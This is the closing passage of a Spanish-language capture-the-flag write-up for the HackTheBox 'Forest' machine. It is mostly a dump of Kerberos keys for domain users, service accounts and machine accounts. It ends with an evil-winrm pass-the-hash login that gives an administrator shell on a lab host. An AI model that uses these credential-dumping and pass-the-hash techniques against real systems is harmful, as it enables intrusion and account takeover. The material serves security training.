htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
abeljm:aes256-cts-hmac-sha1-96:72e4be3dbdd4a078ef8cbcd7dd77b19a3acfbdf3dd0dafbcef1823b56cc9e67a
abeljm:aes128-cts-hmac-sha1-96:10150f581218b5d6b00e2351cf159448
abeljm:des-cbc-md5:86bfa4169eab3764
FOREST$:aes256-cts-hmac-sha1-96:afbb90bab5538dbb53268ac66a87e4b58e5ba9bc6e7e77790f25cd627733d2c9
FOREST$:aes128-cts-hmac-sha1-96:9b3db4e771156a2d04bb568fe089daed
FOREST$:des-cbc-md5:2c7a02a7eaf84526
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up...
```

```bash
❯ evil-winrm -i 10.129.177.231 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 
Ignoring eventmachine-1.3.0.dev.1 because its extensions are not built. Try: gem pristine eventmachine --version 1.3.0.dev.1

Evil-WinRM shell v3.2

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

![Untitled](/assets/images/2022-02-11-writeup-maquina-htb-forest/Untitled%2019.png)

gracias por leer este writeup, nos vemos AbelJM.